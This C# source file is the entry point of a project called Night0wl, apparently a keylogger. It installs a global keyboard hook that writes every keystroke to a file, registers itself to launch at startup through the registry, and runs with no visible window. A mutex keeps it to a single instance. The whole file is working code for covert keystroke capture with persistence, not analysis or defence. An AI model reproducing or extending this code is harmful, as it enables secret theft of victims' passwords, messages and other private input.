using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Night0wl.Common;
using Night0wl.HookApi;
using Night0wl.Startup;

namespace Night0wl
{
    internal static class Program
    {
        private static Hook hook;
        static Mutex mutex = new Mutex(true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04E6BDE8F}");

        [STAThread]
        static void Main()
        {
            try
            {
                if (mutex.WaitOne(TimeSpan.Zero, true))
                {
                    var fullpath = Path.Combine(Const.OUT_DIR, Process.GetCurrentProcess().Id + Const.OUT_FILE);
                    Action<VkCode> onKeyChanged = vkCode => { File.AppendAllText(fullpath, vkCode.GetDescription()); };
                    hook = Hook.GetInstance(onKeyChanged);

                    RegistryManager.MakeAppRunOnStartup();

                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.ApplicationExit += OnApplicationExit;
                    Application.Run();
                    mutex.ReleaseMutex();
                }
            }
            catch (Exception e)
            {
                var errorsFilePath = Path.Combine(Const.OUT_DIR, Const.ERROR_FILE);
                var errorLogMessage = string.Format("{0}{1}{2}{1}{1}", DateTime.UtcNow, Environment.NewLine, e.Message);
                File.AppendAllText(errorsFilePath, errorLogMessage);
            }
        }

        private static void OnApplicationExit(object sender, EventArgs e)
        {
            hook.Dispose();
        }
    }
}